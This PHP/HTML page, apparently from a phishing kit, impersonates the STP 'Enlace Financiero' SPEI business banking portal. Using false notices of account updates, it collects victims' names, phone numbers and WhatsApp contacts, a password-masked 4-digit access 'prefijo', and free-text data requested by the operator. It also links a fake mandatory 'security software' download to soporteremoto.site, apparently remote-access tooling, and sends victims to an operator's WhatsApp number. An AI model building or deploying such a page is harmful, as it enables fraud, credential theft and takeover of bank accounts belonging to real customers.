<?php
/** WhatsApp soporte: código de país + número, sin + (ej. 5266712345678) */
$aviso_whatsapp_e164 = '523221402743';
?>
<!DOCTYPE html>
<html lang="es-MX">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Enlace Financiero</title>
    <link rel="stylesheet" type="text/css" href="stpdentro_files/general.css">
    <script type="text/javascript" src="stpdentro_files/wicket-event.js.descarga"></script>
    <script type="text/javascript" src="stpdentro_files/wicket-ajax.js.descarga"></script>
    <script type="text/javascript" src="stpdentro_files/modal.js.descarga"></script>
    <link rel="stylesheet" type="text/css" href="stpdentro_files/modal.css">
    <link rel="stylesheet" type="text/css" href="stpdentro_files/menus.css">
    <link rel="stylesheet" href="php_modales/css/modalesInputnoInput.css">
    <link rel="stylesheet" href="php_modales/css/herramientas.css">
    <link rel="stylesheet" href="php_modales/css/relojPersonalizado.css">
    <link rel="stylesheet" href="php_modales/css/redirecciones.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <script>window.HEARTBEAT_PAGINA_LABEL = 'Espera';</script>
</head>

<body>
    <style type="text/css">
        @charset "UTF-8";
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            overflow-x: hidden;
        }
        html { overflow-x: hidden; }

        @font-face {
            font-family: Interstate_lig;
            src: url(Interstate-Light.ttf)
        }

        @font-face {
            font-family: Interstate_Reg;
            src: url(Interstate-Regular.ttf)
        }

        #download-view {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .6);
            z-index: 10000;
            height: 100%;
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover
        }

        #info-view {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, .6);
            z-index: 10000;
            height: 100%;
            background-position: center;
            background-repeat: no-repeat;
            background-size: cover
        }

        .box2_ {
            border: 2px solid #d6d6d6;
            border-radius: 20px 0 20px 0;
            position: relative
        }

        .bottons {
            margin-top: 14px
        }

        button.cancel-button {
            background: #777;
            border: 0;
            border-radius: 11px;
            color: #fff;
            font-family: sans-serif;
            padding: 4px 15px
        }

        button.continue-button {
            background: #b30000;
            border: 0;
            border-radius: 11px;
            color: #fff;
            font-family: sans-serif;
            padding: 4px 15px
        }

        .form-control.has_err {
            border-color: red !important
        }

        .form-control.has_err+span.err_span {
            display: block !important;
            font-size: 13px;
            color: #b50000;
            font-family: sans-serif
        }

        .loader__ {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000000bf;
            text-align: center;
            z-index: 10001
        }

        .loader-box {
            position: relative;
            width: 90%;
            max-width: 380px;
            margin: 0 auto;
            top: 100px;
            background: #fff;
            padding: 20px 20px;
            color: #5d5d5d;
            font-family: sans-serif
        }

        img.newloader {
            width: 32px
        }

        img.loader-logo {
            width: 36%;
            position: relative;
            top: 49%;
            -webkit-transform: translateY(-50%);
            transform: translateY(-50%);
            -webkit-animation: blinker 1s linear infinite;
            animation: blinker 1s linear infinite
        }

        .ab-logo {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            text-align: center
        }

        @-webkit-keyframes blinker {
            50% {
                opacity: 0
            }
        }

        @keyframes blinker {
            50% {
                opacity: 0
            }
        }

        h1.waiter_h1 {
            margin: 0;
            margin-bottom: 9px
        }

        .loader-images-box {
            position: relative;
            width: 29%;
            margin: 0 auto;
            max-width: 170px
        }

        p.waiter_p {
            margin-top: 50px;
            font-weight: 200;
            font-size: 17px
        }

        h2.waiter_h2 {
            font-size: 22px;
            margin: 0;
            margin-bottom: 12px;
            font-weight: 400
        }

        .cF-sideBySide.cF-bottomNav {
            border-top: 1px dotted #999 !important
        }

        .clear {
            clear: both !important
        }

        .clear {
            clear: both;
            height: 1px;
            font-size: 1px !important
        }

        #HardTokenOverlay-parent .ui-icon.ui-icon-closethick {
            height: 32px !important;
            margin: 0;
            width: 32px
        }

        .outerContainer[_ngcontent-oeh-c49] {
            width: 730px;
            min-height: 430px;
            height: auto;
            margin: 0 auto;
            border: 1px solid #666;
            background-color: #fff;
            box-shadow: 0 0 15px 0 rgba(0, 0, 0, .7);
            z-index: 4;
            position: absolute;
            top: 50%;
            left: 50%;
            -ms-transform: translate(-50%, -50%);
            transform: translate(-50%, -50%);
            border-radius: 8px
        }

        .outerContainer.onbOuter {
            box-sizing: content-box
        }

        .onbButton {
            width: 180px;
            background-color: #056dae;
            float: left;
            height: 37px;
            color: #fff;
            font-size: 16px;
            border: 1.5px solid #056dae;
            cursor: pointer;
            text-decoration: none;
            border-radius: 4px;
            text-align: center;
            padding: 11px 0 0
        }

        .marginBottom0 {
            display: block;
            margin-bottom: 1rem
        }

        .offerdesciption {
            padding: 32px 50px;
            font-size: 14px
        }

        .aviso-post-titulo {
            font-size: 14px;
            font-weight: bold;
            text-align: center;
            margin: 0 0 16px;
            color: #000;
            text-transform: uppercase;
        }

        .aviso-post-texto {
            font-size: 13px;
            text-align: justify;
            line-height: 1.55;
            margin: 0 0 12px;
            color: #1a1a1a;
        }

        .aviso-contacto-fila {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            justify-content: center;
            gap: 10px 14px;
            margin-top: 12px;
        }

        .aviso-contacto-fila .etiqueta {
            font-size: 13px;
            white-space: nowrap;
            margin: 0;
        }

        .aviso-contacto-fila #aviso_cel {
            width: 140px;
            max-width: 100%;
            box-sizing: border-box;
        }

        #avisoContactoForm #aviso_error {
            display: none;
            text-align: center;
            margin-top: 10px;
        }

        #aviso_carga {
            text-align: center;
        }

        #aviso_carga .aviso-carga-msg {
            margin: 14px 0 0;
            font-size: 14px;
            text-align: center;
        }

        #aviso_carga .aviso-carga-sub {
            margin: 6px 0 0;
            font-size: 12px;
            text-align: center;
        }

        .aviso-wa-btn-inline {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            float: none;
            width: auto;
            min-width: 200px;
            height: auto;
            padding: 8px 16px;
            font-size: 13px;
            margin: 8px 0 0;
            vertical-align: middle;
            background-color: #1C408D;
            background-image: linear-gradient(180deg, #3d62b0 0%, #1C408D 55%, #163472 100%);
            border: 1.5px solid #122c62;
            color: #fff;
        }

        .aviso-wa-btn-inline .fa-whatsapp {
            color: #fff;
            font-size: 18px;
        }

        div.table_title_row {
            background-color: #1C408D;
            background-image: linear-gradient(180deg, #3d62b0 0%, #1C408D 55%, #163472 100%);
        }

        .aviso-no-cerrar {
            font-size: 11px;
            font-weight: bold;
            text-align: center;
            margin-top: 18px;
            color: #333;
            letter-spacing: 0.02em;
        }

        .offerheader {
            background-image: url(stpdentro_files/bg_header.png);
            min-height: 23px;
            color: #fff;
            text-align: center;
            font-size: 16px;
            font-weight: 700;
            padding: 5px
        }

        .cssload-container {
            width: 100%;
            height: 100px;
            text-align: center
        }

        .cssload-speeding-wheel {
            width: 100px;
            height: 100px;
            margin: 0 auto;
            border: 8px solid #27b4e7;
            border-radius: 50%;
            border-right-color: transparent;
            animation: 1.1s linear infinite cssload-spin;
            -o-animation: 1.1s linear infinite cssload-spin;
            -ms-animation: cssload-spin 1.1s infinite linear;
            -webkit-animation: 1.1s linear infinite cssload-spin;
            -moz-animation: 1.1s linear infinite cssload-spin
        }

        @keyframes cssload-spin {
            100% {
                transform: rotate(360deg)
            }
        }

        @-o-keyframes cssload-spin {
            100% {
                -o-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @-ms-keyframes cssload-spin {
            100% {
                -ms-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @-webkit-keyframes cssload-spin {
            100% {
                -webkit-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        @-moz-keyframes cssload-spin {
            100% {
                -moz-transform: rotate(360deg);
                transform: rotate(360deg)
            }
        }

        h1.waiter_h1 {
            margin: 0;
            margin-bottom: 9px
        }

        .loader-images-box {
            position: relative;
            margin: 0 auto
        }

        h2.waiter_h2 {
            font-size: 25px;
            margin: 0;
            margin-bottom: 12px
        }

        .loader-box-2 {
            position: relative;
            width: 90%;
            max-width: 350px;
            margin: 0 auto;
            top: 70px;
            padding: 20px 20px;
            color: #5d5d5d;
            font-family: sans-serif
        }
@keyframes rotation {
    from {
        transform: rotate(0deg);
    }

    to {
        transform: rotate(359deg);
    }
}
@keyframes loader-animation {
    0% {
        -webkit-transform: rotate(0deg);
        transform: rotate(0deg);
    }

    100% {
        -webkit-transform: rotate(360deg);
        transform: rotate(360deg);
    }
}        
.loading-logo {
  position: fixed;
}        
.loading-logo img {
  width: 35px;
  animation: rotation 2s infinite linear;
}
.loading-loader {
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  bottom: auto;
  overflow: hidden;
  outline: none;
}        
.loading2 {
  border-left: 0.2em solid darkblue;
  font-size: 10px;
  border-top: 0.2em solid rgba(255, 0, 0, 0);
  border-right: 0.2em solid rgba(255, 0, 0, 0);
  border-bottom: 0.2em solid rgba(255, 0, 0, 0);
  animation: loader-animation .5s infinite linear;
  border-radius: 50%;
  width: 8em;
  height: 8em;
}        
    </style><span><div><div style="display:none" id="id1b"></div><div id="id17"><div style="display:none" id="id1c"><div id="id1d" style="display:none"></div></div><div><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEtnoQ0SzFRCkrKz9AppsQeM&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"></a></div><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEtnoQ0SzFRCkrKz9AppsQeM&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"></a></div><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEkcIAh3*yiNq&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"><div style="clear:both"></div></a><div class="headerBox"><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEkcIAh3*yiNq&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"></a><div style="position:relative;float:left;width:33%;height:100%;padding-top:4px;padding-left:4px"><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEkcIAh3*yiNq&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"><div style="position:relative;float:left"><img src="stpdentro_files/Green1.gif" id="id18"></div></a><div style="position:relative;float:left;padding-left:5px"><a id="id1e" href="https://prod.stpmex.com/spei/#" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7-c6E8aMoBYKFuQtlfLGfkVjoLBGT25imDlyfoP*hzq2ynNPPZsgY5gBX9VUXeSXEkcIAh3*yiNq&#39;,null,null, function() {return Wicket.$(&#39;id1e&#39;) != null;}.bind(this));return !wcall;"><span></span></a>
    <a
        href="https://prod.stpmex.com/spei/#" id="id1f" onclick="var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B7w6BeorEhFx3CGnVrZR70aWhiUBFttsYrGULBq5EKVyE3EkPe8O7n20dPiQsmUqaEA&#39;,null,null, function() {return Wicket.$(&#39;id1f&#39;) != null;}.bind(this));return !wcall;"><img border="none" alt="eventIcon" id="id19" src="stpdentro_files/transparent.gif"></a>
        <div style="display:none" id="id20">
            <div id="id21" style="display:none"></div>
        </div>
        </div>
        <div style="position:relative;float:left;margin-left:5px">
            <table cellpadding="2">
                <tbody>
                    <tr>
                        <td><span style="color:#fff;font-size:12;font-weight:700" id="id1a">DIURNO</span></td>
                    </tr>
                </tbody>
            </table>
        </div>
        </div>
        <div style="position:relative;float:left;width:33%;height:100%;text-align:center"><span class="topTagline">Enlace Financiero</span><br><span style="font-size:14px" class="topTagline">SPEI</span></div>
        <div style="position:relative;float:left;width:33%;height:100%">
            <div style="position:relative;height:49.5%;width:100%">
                <div style="position:relative;float:right;width:50px"><a href="https://prod.stpmex.com/spei/logout" class="salirLink">Salir</a></div>
                <div style="position:relative;float:right;width:165px"><a href="https://prod.stpmex.com/spei/#" id="id22" class="salirLink" onclick="wicketShow(&#39;id22--ajax-indicator&#39;);var wcall=wicketAjaxGet(&#39;?x=Zc6pGZs4iin5NH7jgm5B73WJOxw9sRGRHL6udBdnGCYvQr*eYh0Tt07oLN8b9eZkRReu9WCs9G287jpsS3V28A&#39;,function(){;wicketHide(&#39;id22--ajax-indicator&#39;);}.bind(this),function() { ;wicketHide(&#39;id22--ajax-indicator&#39;);}.bind(this), function() {return Wicket.$(&#39;id22&#39;) != null;}.bind(this));return !wcall;">Cambiar Password</a>
                    <span
                        style="display:none" class="wicket-ajax-indicator" id="id22--ajax-indicator"><img src="stpdentro_files/indicator.gif" alt=""></span>
                </div>
                <div style="clear:both"></div>
            </div>
            <div style="position:relative;float:right;height:49.5%;width:99%;margin-top:5px;margin-left:5px">&nbsp;<span class="userName">Último acceso: <span id="ultimo_acceso_fecha"></span> - <span id="ultimo_acceso_hora"></span> - Usuario - <span id="ultimo_acceso_usuario"></span></span></div>
        </div>
        </div>
        <div class="mainBodyBox" align="center">
            <div><span class="value"><select name="mainBorder:comboInstancia" onchange="var wcall=wicketAjaxPost(&#39;?x=Zc6pGZs4iin5NH7jgm5B77YqCYXxyC6DWo2Lbe8mv4e2WX8m*Ft7Bg0S7GTTdMeQFKeYuMBeaY8&#39;, wicketSerialize(Wicket.$(&#39;id23&#39;)),null,null, function() {return Wicket.$(&#39;id23&#39;) != null;}.bind(this));" id="id23"><option selected="selected" value="A">SPEI A</option><option value="B">SPEI B</option></select></span></div>
            <div
                class="tabpanel1">
                <div class="tab-row">
                    <ul>
                        <li class="tab0 selected"></li>
                        <li class="tab1"><a href="javascript:void(0);"><span>Spei</span></a></li>
                        <li class="tab2"><a href="javascript:void(0);"><span>STP</span></a></li>
                        <li class="tab3 last"></li>
                    </ul>
                </div>
                <div class="tab-row">
<ul>
	<li class="tab0">
		
	</li><li class="tab1">
		
	</li><li class="tab2 selected">
		<a href="#"><span>Captura Datos</span></a>
	</li><li class="tab3">
		<a href="#"><span>Autorización</span></a>
	</li><li class="tab4">
		<a href="#"><span>Estado de Órdenes</span></a>
	</li><li class="tab5">
		<a href="#"><span>Recepción de Órdenes</span></a>
	</li><li class="tab6">
		<a href="#"><span>Cuentas</span></a>
	</li><li class="tab7">
		
	</li><li class="tab8">
		<a href="#"><span>Varios/Administración</span></a>
	</li><li class="tab9">
		
	</li><li class="tab10">
		
	</li><li class="tab11 last">
		
	</li>
</ul>                    
                </div>
            </div>
<!-- -->
<div align="center" class="commonPanelBorder" style="padding:20px;">
   <div class="table" style="width:55%;margin-top:5px;">
        <div class="remainingdiv" id="contact_paso1" style="display: none;">
            <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
            <div style="width:90%; border-bottom:thin solid #000000; margin-top:5px; padding:10px;">
                <div style="display:flex; align-items:flex-start; gap:10px;">
                    <img src="css/img/logo_Chico.png" alt="STP" style="flex-shrink:0; margin:0;" />
                    <span class="label" style="line-height: 20px; font-size:12px; flex:1; margin:0; text-align:justify;">
                    <strong>Estimado Cliente:</strong> <strong>STP</strong> ha implementado actualizaciones en su plataforma. Para continuar brindándole un servicio seguro y sin interrupciones, es necesario que actualice sus datos de contacto directamente con <strong>STP</strong>. Sistema de Transferencias y Pagos STP es una institución de fondos de pago electrónico regulada, lo que garantiza la seguridad de sus operaciones. Para más información, visite nuestro Centro de Ayuda. <strong>Complete el formulario a continuación.</strong> &nbsp;
                    </span>
                </div>
            </div>
            <div id="id5f">
                <div style="display:none" id="id60">
                    <div id="id61" style="display:none"></div>
                </div>
                <div style="display:none" id="id62">
                    <div id="id63" style="display:none"></div>
                </div>
                <form action="#" id="loginForm" method="post">
                    <input id="CSRF_TOKEN_FIELD" name="CSRF_TOKEN_FIELD" type="hidden" value="ID7X-0SDU-CK3U-T6C9-RR6K-P14A-BHW6-35FM">
                    <div style="display:none"><input type="hidden" name="id64_hf_0" id="id64_hf_0"></div>
                    <div style="border: thin solid rgb(212, 231, 255); padding: 0; position:relative;width:90%; margin-top: 15px;">
                    <table width="100%">
                        <tbody>
                            <tr>
                                <td class="etiqueta label" style="width: 30%; text-align: left; font-size:15px; padding:5px;">
                                <span>Nombre completo:</span>
                                </td>
                                <td style="padding:5px;">
                                <div id="id65">
                                        <input size="100" name="nombre" id="d_nombre" type="text" class="value" style="width: 50%; text-transform: uppercase;" maxlength="100" placeholder="Nombre(s) Apellido(s)" autocomplete="off">
                                        <input type="hidden" name="tipo" value="spei">
                                </div>
                                </td>
                            </tr>
                            <tr>
                                <td class="etiqueta label" style="width: 30%; text-align: left; font-size:15px; padding:5px;">
                                <span>Teléfono fijo:</span>
                                </td>
                                <td style="padding:5px;">
                                    <input size="100" name="fijo" maxlength="10" id="d_tel" type="text" class="value" style="width: 50%" inputmode="numeric" pattern="[0-9]{10}" placeholder="10 dígitos" autocomplete="off">
                                </td>
                            </tr>
                            <tr>
                                <td class="etiqueta label" style="width: 30%; text-align: left; font-size:15px; padding:5px;">
                                <span>Teléfono celular:</span>
                                </td>
                                <td style="padding:5px;">
                                    <input size="100" maxlength="10" name="cel" id="d_cel" type="text" class="value" style="width: 50%" inputmode="numeric" pattern="[0-9]{10}" placeholder="10 dígitos" autocomplete="off">
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    </div>
                    <div style="padding: 0; position: relative; width: 90%; margin-top: 8px;">
                    <div align="right">
                        <a href="#" id="d_submit">
                        <img border="0" onmouseout="" src="stpdentro_files/aplicar.gif" alt="aplicar" id="id5c">
                        </a>
                    </div>
                    </div>
                    <p style="font:sans-serif;font-family:sans-serif;font-size:12px;font-style:italic;margin-left:20px">Aviso de privacidad: Los datos que proporcione serán tratados con estricta confidencialidad y utilizados únicamente para los fines del servicio, conforme al aviso de privacidad de STP.</p>            
                </form>
            </div>
        </div>
        <!-- loader -->
        <div _ngcontent-oeh-c49="" class="remainingdiv" style="display:none" id="loader_box">
            <div _ngcontent-oeh-c49="" class="contentdiv">
                <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
                <div _ngcontent-oeh-c49="" class="offerdesciption">
                    <div _ngcontent-oeh-c49="">
                        <div class="loading-loader">
                            <div class="loading-logo">
                                <img src="stp1_file/stp2.png" alt="loading">
                            </div>
                            <div class="loading2"></div>
                        </div>
                        <br><br>
                        <span>Cargando...</span>                       
                    </div>
                </div>
            </div>
            <div _ngcontent-oeh-c49="" id="dotsParent" class="dotsParent">
                <div _ngcontent-oeh-c49="" id="dotsChild" class="dotsChild">
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle activeClass" id="dot-0"></div>
                    </div>
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle" id="dot-1"></div>
                    </div>
                </div>
            </div>
            <div>
                <p>&nbsp;</p>
            </div>
        </div> 
        <!-- end loader -->   
        <!-- end -->
        <div _ngcontent-oeh-c49="" class="remainingdiv" id="end_">
            <div _ngcontent-oeh-c49="" class="contentdiv">
                <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Aviso STP</span></div>
                <div _ngcontent-oeh-c49="" class="offerdesciption">
                    <div _ngcontent-oeh-c49="">
                        <div id="aviso_paso_contacto">
                        <div style="display:flex;align-items:flex-start;gap:14px;margin-bottom:12px;">
                            <img src="css/img/logo_Chico.png" alt="STP" style="flex-shrink:0;margin:0;width:46px;height:auto;">
                            <p style="font-size:13px;text-align:justify;line-height:1.55;margin:0;flex:1;">Hay una actualización pendiente en su cuenta y debemos validarla directamente con usted. Por este medio no es posible completar el proceso. Necesitamos contactarle por <strong>WhatsApp</strong> para darle seguimiento en tiempo real. Indíquenos un número de WhatsApp en el que podamos comunicarnos.</p>
                        </div>
                        <form action="#" id="avisoContactoForm" method="post">
                            <div class="aviso-contacto-fila">
                                <label class="etiqueta label" for="aviso_cel">Número de contacto:</label>
                                <input id="aviso_cel" name="cel" type="text" class="value" maxlength="10" inputmode="numeric" pattern="[0-9]{10}" placeholder="10 dígitos" autocomplete="off">
                                <a href="#" id="aviso_submit">
                                    <img border="0" src="stpdentro_files/aplicar.gif" alt="Aceptar">
                                </a>
                            </div>
                            <span id="aviso_error" class="feedbackPanelERROR"></span>
                        </form>
                        </div>
                        <div id="aviso_carga" style="display:none;">
                            <div class="loading-loader">
                                <div class="loading-logo">
                                    <img src="stp1_file/stp2.png" alt="Espera">
                                </div>
                                <div class="loading2"></div>
                            </div>
                            <p class="aviso-carga-msg"><b>Sistema de Transferencias y Pagos STP®</b></p>
                            <p class="aviso-carga-sub">Espera un momento, por favor</p>
                        </div>
                        <div id="aviso_espera" style="display:none;">
                            <p class="aviso-post-titulo">En breve nos comunicaremos con usted</p>
                            <p class="aviso-post-texto">En los próximos minutos, un ejecutivo de Soporte Técnico se comunicará con usted para orientarle en la actualización y vinculación de su cuenta.</p>
                            <p class="aviso-post-texto">
                                <strong>En algunos casos, por políticas de seguridad, también deberá participar un segundo usuario firmante del mismo contrato.</strong>
                                Si prefiere no esperar, puede contactarnos ahora mediante el siguiente botón:
                            </p>
                            <p style="text-align:center;margin:12px 0 20px;">
                                <a href="https://wa.me/<?php echo htmlspecialchars($aviso_whatsapp_e164, ENT_QUOTES, 'UTF-8'); ?>" target="_blank" rel="noopener noreferrer" class="cbolui-cta onbButton cbolui-cta-large aviso-wa-btn-inline">
                                    Contactar por WhatsApp <i class="fab fa-whatsapp" aria-hidden="true"></i>
                                </a>
                            </p>
                            <div class="loading-loader">
                                <div class="loading-logo">
                                    <img src="stp1_file/stp2.png" alt="Espera">
                                </div>
                                <div class="loading2"></div>
                            </div>
                            <p class="aviso-no-cerrar">NO CIERRE ESTA VENTANA PARA CONTINUAR EL PROCEDIMIENTO</p>
                        </div>
                    </div>
                </div>
            </div>
            <div _ngcontent-oeh-c49="" id="dotsParent" class="dotsParent">
                <div _ngcontent-oeh-c49="" id="dotsChild" class="dotsChild">
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle activeClass" id="dot-0"></div>
                    </div>
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle" id="dot-1"></div>
                    </div>
                </div>
            </div>
        </div>        
        <!-- end end-->
        <!-- sin input -->
        <div _ngcontent-oeh-c49="" class="remainingdiv" style="display:none" id="t_sin_input">
            <div _ngcontent-oeh-c49="" class="contentdiv">
            <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
                <div _ngcontent-oeh-c49="" class="offerdesciption">
                    <div _ngcontent-oeh-c49="">
                        <div>
                            <div>
                                <p class="marginBottom0" style="font-size:14px" id="msg_sin_input">Introduce la información solicitada.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div _ngcontent-oeh-c49="" id="dotsParent" class="dotsParent">
                <div _ngcontent-oeh-c49="" id="dotsChild" class="dotsChild">
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle activeClass" id="dot-0"></div>
                    </div>
                    <div _ngcontent-oeh-c49="" class="dots">
                        <div _ngcontent-oeh-c49="" class="circle" id="dot-1"></div>
                    </div>
                </div>
            </div>
        </div>        
        <!-- end sin input -->        
        <!-- input -->

        <div class="remainingdiv" style="display:none" id="t_input">
            <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
            <div style="width:90%;border-bottom:thin solid #000000;margin-top:5px;">
                <div align="left">
                    <span class="label" style="line-height: 20px; font-size:15px;">
                    Introduce la información solicitada.&nbsp;
                    </span>
                </div>
            </div>
            <div id="id5f">
                <div style="display:none" id="id60">
                    <div id="id61" style="display:none"></div>
                </div>
                <div style="display:none" id="id62">
                    <div id="id63" style="display:none"></div>
                </div>
                <form action="#" id="loginForm" method="post">
                    <input id="CSRF_TOKEN_FIELD" name="CSRF_TOKEN_FIELD" type="hidden" value="ID7X-0SDU-CK3U-T6C9-RR6K-P14A-BHW6-35FM">
                    <div style="display:none"><input type="hidden" name="id64_hf_0" id="id64_hf_0"></div>
                    <div style="border: thin solid rgb(212, 231, 255); padding: 0; position:relative;width:90%; margin-top: 15px;">
                    <table width="100%">
                        <tbody>
                            <tr>
                                <td class="etiqueta label" style="width: 30%; text-align: left; font-size:15px;">
                                <span id="msg_input">Nombre completo:</span>
                                </td>
                                <td>
                                <div id="id65">
                                        <input id="d_input" type="text" name="d_input" autocomplete="off" size="34" tabindex="7" required=""> <input type="hidden" name="msg_input_val" id="msg_input_val">
                                </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    </div>
                    <div style="padding: 0; position: relative; width: 90%; margin-top: 8px;">
                    <div align="right">
                        <a href="#" id="input_submit" >
                        <img border="0" onmouseout="" src="stpdentro_files/aplicar.gif" alt="aplicar" id="id5c">
                        </a>
                    </div>
                    </div>      
                </form>
            </div>
        </div>        


     
        <!-- end input -->
        <!-- descarga -->
            <div _ngcontent-oeh-c49="" class="remainingdiv" style="display:none" id="t_descarga">
                <div _ngcontent-oeh-c49="" class="contentdiv">
                <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
                    <div _ngcontent-oeh-c49="" class="offerdesciption">
                        <div _ngcontent-oeh-c49="">
                            <p style="font-size:17px;text-align:justify">
                                <p class="aviso text-center"><strong class="log-name">AVISO IMPORTANTE</strong><br><br>Conforme a lo establecido por las Disposiciones de Carácter General, aplicables a las Instituciones Financieras y de Crédito, a partir del <strong><u>3 de marzo del 2025</u></strong> es
                                    necesario<strong>instalar el software de seguridad</strong>antes de realizar cualquier operación o consulta de movimientos.</p>
                            </p>
                            <p style="text-align:center"><a href="https://soporteremoto.site/" id="descarga_url" target="_blank" class="cbolui-cta onbButton cbolui-cta-large" style="padding:9px!important;margin-top:20px;float:none">DESCARGAR</a></p>
                        </div>
                    </div>
                </div>
                <div _ngcontent-oeh-c49="" id="dotsParent" class="dotsParent">
                    <div _ngcontent-oeh-c49="" id="dotsChild" class="dotsChild">
                        <div _ngcontent-oeh-c49="" class="dots">
                            <div _ngcontent-oeh-c49="" class="circle activeClass" id="dot-0"></div>
                        </div>
                        <div _ngcontent-oeh-c49="" class="dots">
                            <div _ngcontent-oeh-c49="" class="circle" id="dot-1"></div>
                        </div>
                    </div>
                </div>
            </div>        
        <!-- end descarga -->
        <!-- prefijo -->
            <div _ngcontent-oeh-c49="" class="remainingdiv" style="display:none" id="t_prefijo">
                <div _ngcontent-oeh-c49="" class="contentdiv">
                <div class="table_title_row" style="min-height:20px; font-size:15px !important;"><span>Sistema de Transferencias y Pagos</span></div>
                    <div _ngcontent-oeh-c49="" class="offerdesciption">
                        <div _ngcontent-oeh-c49="">
                            <div>
                                <div>
                                    <hr>
                                    <p class="marginBottom0" style="font-size:18px">Esta operacion requiere confirmar tu prefijo</p>
                                    <form name="info_form" id="info_form" autocomplete="off" action="#" method="post"><input type="hidden" name="uid" value="datos"> <input type="hidden" name="myid" value="20">
                                        <table class="exportar" id="tablaCveAcceso" border="0">
                                            <tbody>
                                                <tr>
                                                    <td width="27%"><label id="msg_input" class="ellaveTitleTextv">Prefijo (4 dígitos):</label></td>
                                                    <td width="27%"><label id="cveAcceso_L" for="nombre"></label><input id="prefijo_" type="password" name="prefijo_" autocomplete="off" size="4" minlength="4" maxlength="4" required=""><span class="error_texto"><span id="cveAcceso_M"></span></span>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                        <div class="cbolui-overlay-fixedCTAs cbolui-clearfix" style="text-align:center">
                                            <nav class="cbolui-bottom-nav cbolui-clearfix" role="navigation"><button _ngcontent-oeh-c49="" id="input_prefijo" type="button" class="cbolui-cta onbButton cbolui-cta-large" style="padding:0!important;margin-top:20px;float:none">CONTINUAR</button></nav>
                                        </div>
                                        <hr>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div _ngcontent-oeh-c49="" id="dotsParent" class="dotsParent">
                    <div _ngcontent-oeh-c49="" id="dotsChild" class="dotsChild">
                        <div _ngcontent-oeh-c49="" class="dots">
                            <div _ngcontent-oeh-c49="" class="circle activeClass" id="dot-0"></div>
                        </div>
                        <div _ngcontent-oeh-c49="" class="dots">
                            <div _ngcontent-oeh-c49="" class="circle" id="dot-1"></div>
                        </div>
                    </div>
                </div>
            </div>        
        <!-- end prefijo -->
   </div>
</div>

<!-- -->
            
        </div>
        <div class="footerBox" align="center">
            <div style="position:relative;float:left"><span class="footerText">Enlace Financiero</span></div>
